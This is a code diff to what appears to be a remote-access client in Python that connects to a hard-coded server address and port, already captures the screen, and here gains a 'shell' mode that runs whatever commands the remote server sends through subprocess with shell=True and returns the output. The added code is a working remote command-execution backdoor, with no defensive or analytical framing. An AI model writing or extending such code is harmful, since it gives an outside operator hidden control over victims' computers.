@@ -4,6 +4,7 @@ import socket
 import os
 import threading
 from screen import screen_catch_client
+import subprocess
 
 server_addr = "172.24.127.176"
 server_port = 8899
@@ -71,3 +72,10 @@ while True:
             if command["cmd"] == "terminate":
                 terminate_thread(th)
                 break
+    if data["cmd"] == "shell":
+        while True:
+            shell = recv_data(client)
+            if shell["shell"] == "exit":
+                break
+            result = subprocess.run(shell["shell"], shell=True, capture_output=True, text=True)
+            send_data(client, {"result": result})
